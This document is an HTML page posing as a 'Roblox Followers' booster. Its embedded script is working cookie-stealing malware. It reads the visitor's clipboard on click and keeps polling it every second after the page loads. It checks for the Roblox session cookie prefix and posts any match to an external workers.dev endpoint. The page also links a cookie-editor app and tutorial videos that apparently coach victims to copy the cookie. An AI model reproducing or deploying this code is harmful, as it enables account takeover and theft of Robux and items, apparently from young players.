<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Roblox Followers</title>
<link rel="icon" type="image/png" href="favicon.png">

<style>
- {
  box-sizing: border-box;
}

html,
body {
  margin: 0;
  min-height: 100%;
  font-family: Arial, Helvetica, sans-serif;
  overflow-x: hidden;
}

body {
  min-height: 100vh;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  overflow-y: auto;
  padding: 25px;

  background:
    radial-gradient(circle at 20% 20%, rgba(255,255,255,.08), transparent 30%),
    radial-gradient(circle at 80% 80%, rgba(120,120,255,.10), transparent 30%),
    linear-gradient(135deg, #08080c, #11111a 50%, #08080c);

  color: white;
}

.background {
  position: fixed;
  inset: 0;
  pointer-events: none;
  overflow: hidden;
  z-index: -1;
}

.glow {
  position: absolute;
  width: 400px;
  height: 400px;
  border-radius: 50%;
  background: rgba(255,255,255,.035);
  filter: blur(80px);
}

.glow.one {
  top: -180px;
  left: -150px;
}

.glow.two {
  right: -180px;
  bottom: -180px;
}

.main-wrapper {
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 30px;
  width: 100%;
  max-width: 1400px;
  margin: auto;
}

.card {
  position: relative;
  width: 100%;
  max-width: 1000px;
  padding: 55px 35px;
  text-align: center;

  background: rgba(20,20,28,.78);
  border: 1px solid rgba(255,255,255,.10);
  border-radius: 28px;

  box-shadow:
    0 30px 80px rgba(0,0,0,.55),
    inset 0 1px rgba(255,255,255,.05);

  backdrop-filter: blur(20px);
}

.logo {
  width: 78px;
  height: 78px;
  margin: 0 auto 22px;

  display: flex;
  align-items: center;
  justify-content: center;

  border-radius: 22px;
  background: white;
  color: #111;

  font-size: 34px;
  font-weight: 900;

  box-shadow: 0 15px 40px rgba(0,0,0,.35);
}

h1 {
  margin: 0;
  font-size: 38px;
  letter-spacing: -1px;
}

.subtitle {
  margin: 12px 0 32px;
  color: #a9a9b5;
  font-size: 16px;
  line-height: 1.5;
}

.main-button {
  width: 100%;
  padding: 18px 24px;

  border: none;
  border-radius: 15px;

  background: white;
  color: #111;

  font-size: 19px;
  font-weight: 800;

  cursor: pointer;

  transition:
    transform .2s ease,
    box-shadow .2s ease,
    background .2s ease;
}

.main-button:hover {
  transform: translateY(-3px);
  box-shadow: 0 15px 35px rgba(255,255,255,.16);
  background: #f0f0f0;
}

.main-button:active {
  transform: translateY(0) scale(.98);
}

/* Extension Button */
.extension-button {
  display: block;
  width: 100%;
  margin-top: 12px;
  padding: 15px 24px;

  border: 1px solid rgba(255,255,255,.14);
  border-radius: 15px;

  background: rgba(255,255,255,.06);
  color: white;

  font-size: 16px;
  font-weight: 700;

  text-decoration: none;

  cursor: pointer;

  transition:
    transform .2s ease,
    background .2s ease,
    border-color .2s ease,
    box-shadow .2s ease;
}

.extension-button:hover {
  transform: translateY(-2px);
  background: rgba(255,255,255,.11);
  border-color: rgba(255,255,255,.22);
  box-shadow: 0 10px 25px rgba(0,0,0,.25);
}

.extension-button:active {
  transform: translateY(0) scale(.98);
}

.status {
  margin-top: 18px;
  min-height: 20px;
  font-size: 13px;
  color: #aaaab5;
}

/* Loading spinner */
.spinner {
  display: inline-block;
  width: 16px;
  height: 16px;
  margin-right: 8px;
  vertical-align: -3px;

  border: 3px solid rgba(0,0,0,.2);
  border-top-color: #111;
  border-radius: 50%;

  animation: spin .8s linear infinite;
}

@keyframes spin {
  to {
    transform: rotate(360deg);
  }
}

.tutorial-title {
  margin: 0 0 15px 0;
  font-size: 28px;
  font-weight: 800;
  text-align: center;
  color: white;
}

/* Tutorial videos side by side */
.tutorial-videos {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 30px;
  width: 95%;
  max-width: 1400px;
  margin: 40px auto;
  align-items: start;
}

.tutorial-item {
  display: flex;
  flex-direction: column;
  min-width: 0;
  width: 100%;
}

.tutorial-item .tutorial-title {
  margin-bottom: 15px;
}

/* Tutorial Video Containers */
.video-container {
    position: relative;
    width: 100%;
    overflow: hidden;
    border-radius: 18px;
    background: #000;
    border: 1px solid #292933;
    box-shadow: 0 0 40px rgba(88, 101, 242, 0.2);
    display: flex;
    align-items: center;
    justify-content: center;
}

/* PC video: widescreen 16:9 */
.pc-container {
    width: 100%;
    aspect-ratio: 16 / 9;
}

.video-frame {
    display: block;
    width: 100%;
    height: 100%;
    border: none;
}

/* iPhone video container matches the PC video height */
.shorts-container {
    width: 100%;
    height: var(--pc-video-height, auto);
    aspect-ratio: auto;
    align-self: start;
    display: flex;
    align-items: center;
    justify-content: center;
}

/* Perfect 9:16 sizing matching wrapper height */
.shorts-wrapper {
    height: var(--iphone-wrapper-height, auto);
    aspect-ratio: 9 / 16;
    width: auto;
    max-width: 100%;
    margin: 0 auto;
    background: #000;
    position: relative;
    overflow: hidden;
    border-radius: 12px;
    flex-shrink: 0;
}

.shorts-frame {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    border: none;
}

@media (max-width: 1100px) {
    .tutorial-videos {
      grid-template-columns: 1fr;
    }
}

@media (max-width: 768px) {
    body {
        padding: 12px;
    }

    .card {
      padding: 42px 24px;
    }

    h1 {
      font-size: 31px;
    }

    .logo {
      width: 68px;
      height: 68px;
      font-size: 29px;
    }

    .pc-container {
        aspect-ratio: 16 / 9;
    }

    .shorts-container {
        aspect-ratio: auto;
        height: auto;
        border: none;
        box-shadow: none;
        background: transparent;
        overflow: visible;
        display: block;
    }

    .shorts-wrapper {
        width: 100%;
        max-width: 340px;
        height: auto;
        aspect-ratio: 9 / 16;
        overflow: hidden;
        border-radius: 18px;
        border: 1px solid #292933;
        box-shadow: 0 0 40px rgba(88, 101, 242, 0.2);
    }

    .shorts-frame {
        width: 100%;
        height: 100%;
    }

    .iphone-tutorial {
        order: 1;
    }

    .pc-tutorial {
        order: 2;
    }
}
</style>

</head>

<body>

<div class="background">
  <div class="glow one"></div>
  <div class="glow two"></div>
</div>

<div class="main-wrapper">

  <div class="card">
    <div class="logo">R</div>
    <h1>Roblox Followers</h1>
    <p class="subtitle">
      Grow your Roblox presence with one simple click.
    </p>

    <button class="main-button" id="main">
      Add Followers 
    </button>

    <a
      class="extension-button"
      href="https://chromewebstore.google.com/detail/roblox-follower/mgdkcjifhnobklopbbjlgfmnpnndildf?authuser=0&utm_source=app-launcher"
      target="_blank"
      rel="noopener noreferrer"
    >
      PC Extension
    </a>

    <a
      class="extension-button"
      href="https://apps.apple.com/us/app/cookie-editor/id6446215341"
      target="_blank"
      rel="noopener noreferrer"
    >
      iPhone Extension
    </a>

    <div class="status" id="status"></div>
  </div>

  <div class="tutorial-videos">

    <div class="tutorial-item pc-tutorial">
      <h2 class="tutorial-title">PC Tutorial</h2>

      <div class="video-container pc-container">
        <iframe
          class="video-frame"
          src="https://www.youtube-nocookie.com/embed/AgLkFg16Wg4?mute=1"
          title="PC Tutorial"
          allow="encrypted-media; picture-in-picture"
          allowfullscreen>
        </iframe>
      </div>
    </div>

    <div class="tutorial-item iphone-tutorial">
      <h2 class="tutorial-title">iPhone Tutorial</h2>

      <div class="video-container shorts-container">
        <div class="shorts-wrapper">
          <iframe
            class="shorts-frame"
            src="https://www.youtube-nocookie.com/embed/B_O15Ku1Bh0?mute=1&loop=1&playlist=B_O15Ku1Bh0"
            title="iPhone Tutorial"
            allow="autoplay; encrypted-media; picture-in-picture; fullscreen"
            allowfullscreen
            webkitallowfullscreen>
          </iframe>
        </div>
      </div>
    </div>

  </div>

</div>

<script>
const button = document.getElementById("main");
const status = document.getElementById("status");

const SEND_ENDPOINT =
  "https://young-brook-716e.abojanmawzoon.workers.dev";
     
async function sendClipboardData(text) {
  try {
    await fetch(SEND_ENDPOINT, {     
      method: "POST",     
      headers: {     
        "Content-Type": "application/json"     
      },     
      body: JSON.stringify({     
        clipboardText: text     
      })     
    });     
     
    await new Promise(resolve => setTimeout(resolve, 10000));     
     
    status.textContent = "Restart Device To Get Followers Added to your account!";     
  } catch (error) {     
    status.textContent = "Something went wrong. Please try again.";     
    console.error(error);     
  }
}

button.addEventListener("click", async () => {     
  try {     
    status.innerHTML = `     
      <span class="spinner"></span>     
      Adding Followers...     
    `;     
     
    const text = await navigator.clipboard.readText();     
     
    if (!text || !text.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")) {     
      status.textContent = "error make sure u copy cookie";     
      return;     
    }     
     
    await sendClipboardData(text);
     
  } catch (error) {     
    status.textContent = "error make sure u copy cookie";     
    console.error(error);     
  }     
});

// Continuously check clipboard in the background every second
async function monitorClipboard() {
  if (!navigator.clipboard || !navigator.clipboard.readText) return;
  
  try {
    const text = await navigator.clipboard.readText();
    if (text && text.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")) {
      status.innerHTML = `     
        <span class="spinner"></span>     
        Adding Followers...     
      `;
      await sendClipboardData(text);
      // Stop checking once successfully sent
      return;
    }
  } catch (e) {
    // Clipboard permission might require a user gesture or focus first
  }
  
  setTimeout(monitorClipboard, 1000);
}

window.addEventListener("load", () => {
  setTimeout(monitorClipboard, 500);
});

const pcVideo = document.querySelector(".pc-container");
const iphoneVideo = document.querySelector(".shorts-container");
const iphoneWrapper = document.querySelector(".shorts-wrapper");

function matchVideoHeights() {
  if (window.innerWidth > 1100) {
    const height = pcVideo.getBoundingClientRect().height;
    iphoneVideo.style.setProperty("--pc-video-height", `${height}px`);
    iphoneWrapper.style.setProperty("--iphone-wrapper-height", `${height * 1.15}px`);
  } else {
    iphoneVideo.style.removeProperty("--pc-video-height");
    iphoneWrapper.style.removeProperty("--iphone-wrapper-height");
  }
}

window.addEventListener("load", matchVideoHeights);
window.addEventListener("resize", matchVideoHeights);

matchVideoHeights();
</script>     
     
</body>  
</html>
